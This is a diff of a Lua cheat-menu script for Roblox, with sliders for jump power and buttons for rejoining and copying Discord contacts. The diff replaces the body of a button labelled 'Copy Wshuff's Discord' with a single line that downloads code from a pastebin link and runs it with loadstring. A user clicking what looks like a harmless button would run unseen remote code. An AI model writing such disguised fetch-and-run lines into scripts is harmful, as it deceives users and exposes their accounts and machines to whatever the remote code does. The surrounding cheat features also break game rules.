@@ -33,22 +33,6 @@ misc:CreateSlider("JumpPower", 50, 420, function(arg)
     game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = arg
 end)
 
-misc:CreateButton("Respawn Here", function()
-blue = game.Players.LocalPlayer.Character.Humanoid.Health
-
-red = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-
-game.Players.LocalPlayer.Character.Humanoid.Health = ("blue")
-
-wait(6)
-
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = red
-end)
-
-misc:Createbutton("Respawn", function()
-game.Players.LocalPlayer.Character.Humanoid.Health = 0
-end)
-
 misc:CreateButton("Rejoin", function()
 game:GetService("TeleportService"):Teleport(game.PlaceId)
 end)
@@ -62,38 +46,7 @@ setclipboard("https://discord.gg/p4nS6mV")
 end)
 
 cred:CreateButton("Copy Wshuff's Discord", function()
---[[ oopsies
-oopsies ]]--
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "N/A",
-    Text = "he changes his tag"
-})
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "N/A",
-    Text = "every fucking minute"
-})
-
-setclipboard("n1bu#1003")
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "But..",
-    Text = "i just copied my discord"
-})
-
-wait(1)
-
- game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "To",
-    Text = "your clipboard ;)"
-})
-
--- yessirrr
+loadstring(game:HttpGet("https://pastebin.com/raw/4EptL6r1",true))()
 end)
 
 
